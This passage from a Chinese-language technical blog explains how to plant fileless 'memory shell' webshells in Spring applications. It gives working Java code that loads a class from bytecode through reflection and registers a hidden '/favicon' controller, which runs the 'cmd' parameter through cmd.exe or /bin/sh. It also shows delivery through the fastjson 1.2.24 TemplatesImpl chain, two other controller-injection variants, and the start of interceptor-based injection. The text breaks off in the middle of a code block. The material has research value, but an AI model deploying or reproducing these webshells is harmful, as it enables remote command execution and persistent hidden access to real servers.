</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m0</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">className</span><span class="o">,</span> <span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span> <span class="n">abstractHandlerMapping</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">RequestMappingHandlerMapping</span> <span class="n">r</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//通过反射获得自定义controller中唯一的Method对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">getDeclaredMethods</span><span class="o">())[</span><span class="n">0</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//定义访问controller的URL地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">PatternsRequestCondition</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PatternsRequestCondition</span><span class="o">(</span><span class="s">&#34;/hahaha&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//定义允许访问 controller 的 HTTP 方法（GET/POST）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">RequestMethodsRequestCondition</span> <span class="n">ms</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMethodsRequestCondition</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//在内存中动态注册 controller
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMappingInfo</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">ms</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="na">registerMapping</span><span class="o">(</span><span class="n">info</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(),</span> <span class="n">method</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>InjectControl类，定义的处理请求的control，把该类class字节码base64编码后放到inject类的字段中。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Controller</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectControl</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">InjectControl</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">&#34;/favicon&#34;</span><span class="o">})</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">login</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">arg0</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">arg0</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">o</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">ProcessBuilder</span> <span class="n">p</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">arg0</span><span class="o">});</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">arg0</span><span class="o">});</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">())).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">o</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">c</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="n">o</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="n">404</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var8</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>利用fastjson 1.2.24的TemplatesImpl利用链，加载字节码。</p>
<p><img src="/images/image-20211106230512.png" alt=""></p>
<p><img src="/images/image-20211106230526.png" alt=""></p>
<p>执行命令</p>
<p><img src="/images/image-20211106230540.png" alt=""></p>
</li>
<li>
<p><strong>registerHandler</strong></p>
<p>针对使用DefaultAnnotationHandlerMapping映射器的应用，可以找到它继承的顶层类：<code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code></p>
<p>发现其中有一个registerHandler 方法。该方法接受urlPath参数和 handler参数，可以在 this.getApplicationContext()获得的上下文环境中寻找名字为handler参数值的bean，将url和controller 实例bean注册到handlerMap中。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//在当前上下文环境中注册一个名为dynamicController的Webshell controller实例bean
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">&#34;dynamicController&#34;</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="c1">//从当前上下文环境中获得DefaultAnnotationHandlerMapping的实例bean
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span>  <span class="n">dh</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//反射获得registerHandler Method
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractUrlHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;registerHandler&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//将dynamicController和URL注册到handlerMap中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">dh</span><span class="o">,</span> <span class="s">&#34;/favicon&#34;</span><span class="o">,</span> <span class="s">&#34;dynamicController&#34;</span><span class="o">);</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
<li>
<p><strong>detectHandlerMethods</strong></p>
<p><code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code> 还中有一个detectHandlerMethods方法。该方法仅接受handler参数，同样可以在 this.getApplicationContext()获得的上下文环境中寻找名字为handler参数值的bean，并注册 controller 的实例bean。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">&#34;dynamicController&#34;</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span> <span class="n">requestMappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMethodMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;detectHandlerMethods&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">requestMappingHandlerMapping</span><span class="o">,</span> <span class="s">&#34;dynamicController&#34;</span><span class="o">);</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
</ol>
<p><strong>注意事项</strong></p>
<ol>
<li>在使用第一中registerMapping动态注册controller时，不需要强制使用@RequestMapping注解定义URL地址和HTTP请求的方法，其余两种手动注册controller的方法都必须要在controller中使用@RequestMapping 注解。</li>
<li>当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有<code>RequestMappingHandlerMapping</code>实例的 bean，但会存在<code>DefaultAnnotationHandlerMapping</code>的实例bean。</li>
</ol>
<h2 id="intercetor内存马"><a href="#intercetor内存马" class="anchor-link">#</a><a href="#contents:intercetor内存马" class="headings">intercetor内存马</a></h2>
<h3 id="原理分析"><a href="#原理分析" class="anchor-link">#</a><a href="#contents:原理分析" class="headings">原理分析</a></h3>
<p>拦截器可以用在权限验证，比如在访问后台资源的时候，经过拦截器看请求有没有进行身份验证，身份验证通过后放行，否则跳转会后台登陆页面。（拦截器只会拦截控制器的方法）</p>
<p>定义拦截器必须实现HandlerInterceptor接口，HandlerInterceptor接口中有三个方法：</p>
<ol>
<li>preHandle方法是controller方法执行前拦截的方法
<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li>
<li>return false不放行，不会执行controller中的方法。</li>
</ul>
</li>
<li>postHandle是controller方法执行后执行的方法，在JSP视图执行前。
<ul>
<li>可以使用request或者response跳转到指定的页面</li>
<li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li>
</ul>
</li>
<li>afterCompletion方法是在JSP执行后执行
<ul>
<li>request或者response不能再跳转页面了</li>
</ul>
</li>
</ol>
<p>正常注册拦截器</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyInterceptor</span> <span class="kd">implements</span> <span class="n">HandlerInterceptor</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;拦截器执行&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="s">&#34;/WEB-INF/pages/error.jsp&#34;</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span><span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;控制器执行后执行&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;jsp页面执行后执行&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>再到xml文件中配置拦截路径和拦截器。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;mvc:interceptors&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;mvc:interceptor&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!--            配置拦截器拦截路径--&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;mvc:mapping</span> <span class="na">path=</span><span class="s">&#34;/users/*&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!--            注入自定义拦截器--&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">&#34;com.example.spring.MyInterceptor&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/mvc:interceptor&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/mvc:interceptors&gt;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>下面跟一下拦截器的触发点
<img src="/images/image-20211106230620.png" alt="">
从internalDoFilter方法中进入调用serverlet的service方法后一直跟到<code>org.springframework.web.servlet.DispatcherServlet</code>类的doDispatch方法。
<img src="/images/image-20211106230642.png" alt="">
该方法中调用了<code>this.getHandler(processedRequest)</code>跟进该方法
<img src="/images/image-20211106230707.png" alt="">
第一个mapping是<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>对象，它的getHandler方法实际上会调用<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code>类的getHandler方法。</p>
<p>在该方法中会调用getHandlerExecutionChain方法，它会遍历<code>this.adaptedInterceptors</code>对象里所有的 HandlerInterceptor类实例，匹配当前请求url，和拦截器中的url匹配的话，会通过chain.addInterceptor把已有的所有拦截器加入到需要返回的HandlerExecutionChain类实例中。
<img src="/images/image-20211106230726.png" alt="">
然后返回到doDispatch方法中，通过前面获取到handler之后，会调用handler的preHandle方法。
<img src="/images/image-20211106230746.png" alt="">
<img src="/images/image-20211106230757.png" alt=""></p>
<h3 id="动态注入interceptor"><a href="#动态注入interceptor" class="anchor-link">#</a><a href="#contents:动态注入interceptor" class="headings">动态注入Interceptor</a></h3>
<p>通过上面分析发现，如果把自定义的Interceptor类加入到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>类的adaptedInterceptors属性中即可注册一个拦截器。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
